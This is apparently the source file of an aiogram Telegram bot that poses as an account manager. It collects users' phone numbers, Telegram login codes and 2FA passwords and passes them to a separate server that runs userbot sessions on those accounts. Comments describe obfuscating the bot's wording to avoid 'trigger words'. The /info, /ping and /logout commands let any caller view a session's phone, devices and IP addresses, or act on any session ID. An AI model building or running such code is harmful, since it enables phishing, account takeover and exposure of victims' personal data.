import os
import sys
import aiohttp
from aiogram import Router, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

from pathlib import Path

# ISOLATION: Get MVP root for imports
BASE_DIR = Path(__file__).resolve().parents[1]
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from bot_server.obfuscator import obfuscate
from shared.config import MANAGER_API_URL, SHOW_ALL_SESSIONS_IN_INFO

router = Router()

class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()

@router.message(Command("start"))
async def start_cmd(message: Message):
    """Start of dialog. Greeting without trigger words."""
    await message.answer(
        "Hello! I am a bot to manage your accounts.\n\n"
        "Available commands:\n"
        "➕ /login — Connect new account (one account per ID)\n"
        "📋 /sessions — List of all active accounts (by ID)\n"
        "ℹ️ /info [id] — Get account data. Takes your ID by default (e.g., /info 1234567)\n"
        "📨 /ping [id] — [TEST] Send task: write to 'Saved Messages'.\n"
        "❌ /logout [id] — Logout from account and delete session."
    )

@router.message(Command("login"))
async def login_cmd(message: Message, state: FSMContext):
    """Initiating phone request. Using obfuscator to mask words!"""
    text = obfuscate("To connect your account, send your phone number by pressing the button below. We verify that the contact belongs to you.")
    
    # Share Contact button
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=obfuscate("Send my number"), request_contact=True)]],
        resize_keyboard=True
    )
    await message.answer(text, reply_markup=keyboard)
    await state.set_state(AuthState.waiting_for_phone)

from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

def get_code_kb(current_code: str = "") -> InlineKeyboardMarkup:
    """Generation of digital keyboard (0-9) for code input."""
    # Create buttons 1-9 in a 3x3 grid
    buttons = []
    for i in range(1, 10, 3):
        row = [InlineKeyboardButton(text=str(j), callback_data=f"code_{j}") for j in range(i, i + 3)]
        buttons.append(row)
    
    # Add 0 and "Clear" button (C)
    buttons.append([
        InlineKeyboardButton(text="❌", callback_data="code_clear"),
        InlineKeyboardButton(text="0", callback_data="code_0"),
        InlineKeyboardButton(text="⬅️", callback_data="code_back")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@router.message(AuthState.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    """Got phone, sending request to Manager Server."""
    # STRICT CONTACT CHECK
    if not message.contact:
        await message.answer("⚠️ Please use the button at the bottom of the screen to send your contact.")
        return
        
    if message.contact.user_id != message.from_user.id:
        await message.answer("⚠️ That is someone else's contact! Please send YOUR contact via the button below.")
        return

    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone

    session_id = str(message.from_user.id)
    wait_msg = await message.answer("Wait...", reply_markup=ReplyKeyboardRemove())

    # Step 1 REST API: Code request
    async with aiohttp.ClientSession() as session:
        try:
            payload = {"phone": phone, "session_id": session_id}
            async with session.post(f"{MANAGER_API_URL}/api/auth/send_code", json=payload) as resp:
                data = await resp.json()
                if resp.status == 200:
                    await state.update_data(phone=phone, session_id=session_id, current_code="")
                    
                    try:
                        await wait_msg.delete()
                    except:
                        pass
                    
                    text = obfuscate("Enter Telegram CODE (5 digits):") + "\n\n`_ _ _ _ _`"
                    await message.answer(text, reply_markup=get_code_kb(), parse_mode="Markdown")
                    await state.set_state(AuthState.waiting_for_code)
                else:
                    await wait_msg.answer(f"Server error: {data.get('detail')}")
                    await state.clear()
        except Exception as e:
            await wait_msg.answer(f"Manager server API unavailable: {e}")
            await state.clear()

@router.callback_query(AuthState.waiting_for_code, lambda c: c.data.startswith("code_"))
async def process_code_callback(callback: CallbackQuery, state: FSMContext):
    """Processing numeric key presses."""
    cmd = callback.data.split("_")[1]
    data = await state.get_data()
    current_code = data.get("current_code", "")
    phone = data.get("phone")
    session_id = data.get("session_id")

    if cmd == "clear":
        current_code = ""
    elif cmd == "back":
        current_code = current_code[:-1]
    else:
        if len(current_code) < 5:
            current_code += cmd

    await state.update_data(current_code=current_code)
    
    mask = " ".join([f"`{current_code[i]}`" if i < len(current_code) else "`_`" for i in range(5)])
    text = obfuscate("Enter Telegram CODE (5 digits):") + f"\n\n{mask}"
    
    if len(current_code) < 5:
        await callback.message.edit_text(text, reply_markup=get_code_kb(current_code), parse_mode="Markdown")
        await callback.answer()
    else:
        await callback.message.edit_text(obfuscate("Checking code...") + f"\n\n{mask}", parse_mode="Markdown")
        await callback.answer("Logging in...")
        
        async with aiohttp.ClientSession() as session:
            try:
                payload = {"phone": phone, "session_id": session_id, "code": current_code}
                async with session.post(f"{MANAGER_API_URL}/api/auth/login", json=payload) as resp:
                    data = await resp.json()
                    if resp.status == 200:
                        await callback.message.answer(
                            f"✅ Account connected!\n"
                            f"Your Session ID: {data['id']}\n"
                            f"Name: {data['username']}"
                        )
                        await state.clear()
                    elif resp.status == 401:
                        await state.update_data(code=current_code)
                        text = obfuscate("🔐 You have 2FA enabled. Enter account password:")
                        await callback.message.answer(text)
                        await state.set_state(AuthState.waiting_for_password)
                    else:
                        detail = data.get('detail', 'Unknown error')
                        if detail == "PHONE_CODE_INVALID":
                            await callback.message.answer("❌ Invalid code! Please enter the code again.")
                            await state.update_data(current_code="")
                            text = obfuscate("Enter Telegram CODE (5 digits):") + "\n\n`_ _ _ _ _`"
                            await callback.message.edit_text(text, reply_markup=get_code_kb(), parse_mode="Markdown")
                        elif detail == "PHONE_CODE_EXPIRED":
                            await callback.message.answer("❌ Code expired! Please start the login process again with /login.")
                            await state.clear()
                        else:
                            await callback.message.answer(f"❌ Auth error: {detail}")
                            await state.clear()
            except Exception as e:
                await callback.message.answer(f"Lost connection to server: {e}")
                await state.clear()

@router.message(AuthState.waiting_for_password)
async def process_password(message: Message, state: FSMContext):
    """Sending 2FA password to server."""
    password = message.text.strip()
    data = await state.get_data()
    phone = data.get("phone")
    session_id = data.get("session_id")
    code = data.get("code")

    await message.answer("Checking password...")

    async with aiohttp.ClientSession() as session:
        try:
            payload = {"phone": phone, "session_id": session_id, "code": code, "password": password}
            async with session.post(f"{MANAGER_API_URL}/api/auth/login", json=payload) as resp:
                data = await resp.json()
        except aiohttp.ClientError as e:
            print(f"[ERROR] Manager API Connection Failed (/login): {e}")
            await message.answer("⚠️ Failed to connect to auth server.")
            await state.clear()
            return

    if data.get("status") == "success":
        await message.answer(
            f"✅ Success! Account with 2FA connected.\n"
            f"Session ID: {data['id']}\n"
            f"Name: {data['username']}"
        )
        await state.clear()
    elif data.get("detail") == "PASSWORD_INVALID":
        await message.answer("❌ Incorrect password! Please try entering your 2FA password again.")
    else:
        await message.answer(f"❌ Auth error: {data.get('detail')}")

@router.message(Command("sessions"))
async def list_sessions_cmd(message: Message):
    """Request list of all userbots from Manager."""
    data = None
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"{MANAGER_API_URL}/api/sessions") as resp:
                if resp.status == 200:
                    data = await resp.json()
                else:
                    await message.answer("Manager error while getting list.")
                    return
        except aiohttp.ClientError as e:
            print(f"[ERROR] Manager API Connection Failed (/sessions): {e}")
            await message.answer("⚠️ Manager server is temporarily unavailable. Try again later.")
            return

    sessions = data.get("sessions", [])
    if not sessions:
        await message.answer("No active userbots.")
        return
    
    text = "🤖 **Active userbots:**\n\n"
    for s in sessions:
        status = "🟢" if s['is_running'] else "🔴"
        # Exclude ID in backticks for easy copying in TG
        text += f"{status} ID: `{s['session_id']}`\n"
    
    await message.answer(text, parse_mode="Markdown")

async def get_session_id_fallback(message: Message):
    """Helper to get session_id: from arguments or current user ID."""
    args = message.text.split()
    if len(args) >= 2:
        return args[1]
    
    # By default, return the ID of the user who sent the command
    return str(message.from_user.id)

@router.message(Command("info"))
async def get_info_cmd(message: Message):
    """Get info. If ID is not specified - look for current user's account."""
    session_id = await get_session_id_fallback(message)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"{MANAGER_API_URL}/api/sessions/{session_id}/info") as resp:
                if resp.status == 200:
                    data = await resp.json()
                    username = f"@{data.get('username')}" if data.get('username') else "missing"
                    
                    info_text = (
                        f"🆔 **Session ID:** `{data.get('id')}`\n"
                        f"👤 **Name:** {data.get('first_name')}\n"
                        f"🔗 **Username:** {username}\n"
                        f"📞 **Phone:** {data.get('phone')}\n\n"
                    )
                    
                    sessions = data.get("sessions", [])
                    if sessions:
                        # 1. Filter current session (always shown)
                        current_session = next((s for s in sessions if s.get("current")), None)
                        # 2. Filter other sessions (gated by config)
                        other_sessions = [s for s in sessions if not s.get("current")]
                        
                        displayed_sessions = []
                        if current_session:
                            displayed_sessions.append(current_session)
                        
                        if SHOW_ALL_SESSIONS_IN_INFO:
                            displayed_sessions.extend(other_sessions)
                        
                        if displayed_sessions:
                            # Header and separators only shown when listing ALL sessions
                            if SHOW_ALL_SESSIONS_IN_INFO:
                                info_text += "📱 **Active Sessions:**\n"
                            
                            for s in displayed_sessions:
                                if SHOW_ALL_SESSIONS_IN_INFO:
                                    info_text += "━━━━━━━━━━━━━━━\n"
                                
                                # "This session" tag only needed when multiple sessions are visible
                                current_tag = " ✨ This session\n" if s.get("current") else ""
                                
                                info_text += (
                                    f"{current_tag}"
                                    f"🖥 **Device:** {s.get('device_model')} ({s.get('platform')})\n"
                                    f"⚙️ **System:** {s.get('system_version')}\n"
                                    f"📦 **App:** {s.get('app_name')} v{s.get('app_version')}\n"
                                    f"🌐 **IP:** {s.get('ip')} ({s.get('country')})\n"
                                    f"💠 **Official:** {'Yes' if s.get('official_app') else 'No'}\n"
                                    f"🕒 **Last Active:** {s.get('date_active')}\n"
                                )
                                # Extra newline between sessions if there are more than one
                                if SHOW_ALL_SESSIONS_IN_INFO:
                                    info_text += "\n"
                    
                    await message.answer(info_text, parse_mode="Markdown")
                else:
                    await message.answer(f"Session with ID {session_id} not found or offline.")
        except Exception as e:
            await message.answer(f"Manager server unavailable: {e}")

@router.message(Command("ping"))
async def send_ping_cmd(message: Message):
    """Connection test. If ID not specified - use own."""
    session_id = await get_session_id_fallback(message)
    
    payload = {
        "target": "me",
        "text": "Connection test. Everything is fine. 1.. 2.. 3.."
    }
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(f"{MANAGER_API_URL}/api/sessions/{session_id}/action/send_message", json=payload) as resp:
                data = await resp.json() if resp.content_type == 'application/json' else await resp.text()
                if resp.status == 200:
                    await message.answer(f"✅ Task successfully sent to userbot ({session_id})!")
                elif resp.status == 404:
                    await message.answer(f"❌ Userbot ({session_id}) **is not bound** to an account. Use /login", parse_mode="Markdown")
                elif resp.status == 401:
                    await message.answer(f"⚠️ **Access lost!** Session ({session_id}) was revoked or banned. Remove it (/logout) and login again.", parse_mode="Markdown")
                elif resp.status == 429:
                    detail = data.get("detail", "Too many requests") if isinstance(data, dict) else data
                    await message.answer(f"⏳ **Telegram limit:** {detail}")
                elif resp.status == 503:
                    await message.answer(f"⚠️ Userbot ({session_id}) is bound, but **no network**.", parse_mode="Markdown")
                else:
                    detail = data.get("detail", "Unknown error") if isinstance(data, dict) else data
                    await message.answer(f"❌ Error sending task for {session_id}: {detail}")
        except Exception as e:
            await message.answer(f"Manager server unavailable: {e}")

@router.message(Command("logout"))
async def send_logout_cmd(message: Message):
    """Logout from account and delete session."""
    session_id = await get_session_id_fallback(message)
    
    wait_msg = await message.answer(f"Disconnecting account {session_id}...")
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(f"{MANAGER_API_URL}/api/sessions/{session_id}/logout") as resp:
                data = await resp.json() if resp.content_type == 'application/json' else await resp.text()
                if resp.status == 200:
                    await wait_msg.edit_text(f"✅ Account ({session_id}) successfully disconnected and all session data removed!")
                else:
                    await wait_msg.edit_text(f"❌ Error: Session ({session_id}) not found in the system.")
        except Exception as e:
            await wait_msg.edit_text(f"Manager server unavailable: {e}")
